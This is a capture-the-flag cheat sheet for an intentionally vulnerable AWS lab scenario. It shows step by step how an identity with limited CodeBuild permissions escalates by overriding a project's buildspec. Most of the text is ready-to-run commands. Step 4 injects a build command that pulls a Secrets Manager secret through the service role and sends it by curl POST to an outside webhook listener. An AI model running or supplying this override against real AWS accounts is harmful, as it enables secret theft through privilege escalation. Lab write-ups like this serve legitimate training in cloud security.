# Cheat Sheet - codebuild_buildspec_override_and_privesc_service_role

## Setup

```bash
# Configure the starting profile using the credentials from start.txt
aws configure --profile bob
# Enter the access key ID, secret access key, and your preferred region (e.g. us-east-1)
```

---

## Step 1 — Enumerate CodeBuild Projects

```bash
aws codebuild list-projects --profile bob
```

Note the project name — it will look like `cg-vulnerable-project-<cgid>`.

---

## Step 2 — Inspect the Project

```bash
aws codebuild batch-get-projects \
  --names cg-vulnerable-project-<cgid> \
  --profile bob
```

Check environment.environmentVariables; there should be a variable with the fields `NAME`, `value`, and `type`, where `type` should be SECRETS_MANAGER. 
Note down the `value`, its name of secret, which have to use in step4

---

## Step 3 — Set Up a Listener

On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret:

```bash
# Use a public endpoint service such as https://webhook.site
# Copy the unique URL it gives you
```

Make note of your listener URL, the webhook.site URL.

---

## Step 4 — Inject Inline Buildspec and Start the Build

Replace `<project-name>` and `<listener-url>` with your values.

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-<cgid> \
  --buildspec-override '
version: 0.2
phases:
  build:
    commands:
      - VALUE=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query "SecretString" --output text)
      - curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
' \
  --profile bob
```

Note that `$SECRET_NAME` is not defined anywhere in this override. It is inherited automatically, because CodeBuild injects the project's own environment variables (the one you found in Step 2) into the build container regardless of any `buildspecOverride`.

Note the `id` returned in the response — you can use it to track the build.

---

## Step 5 — Monitor the Build (Optional)

```bash
aws codebuild batch-get-builds \
  --ids <build-id> \
  --profile bob
```

Wait until `buildStatus` changes from `IN_PROGRESS` to `SUCCEEDED`.

---

## Step 6 — Collect the Secret

Check your listener. The secret value (the flag) will arrive as a POST body within a few seconds of the build reaching the `build` phase.

Example output at listener:
```
{"flag":"cg-secret-flag-<cgid>"}
```

**Scenario complete.**

---

## Key Vulnerability

`codebuild:BatchGetProjects` returns a project's plaintext environment variables, which here discloses the exact name of the target secret. `codebuild:StartBuild` separately accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, while still injecting the project's own environment variables into the build. Combined with a service role that holds `secretsmanager:GetSecretValue` on `*`, an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate the secret without ever holding Secrets Manager permissions itself.
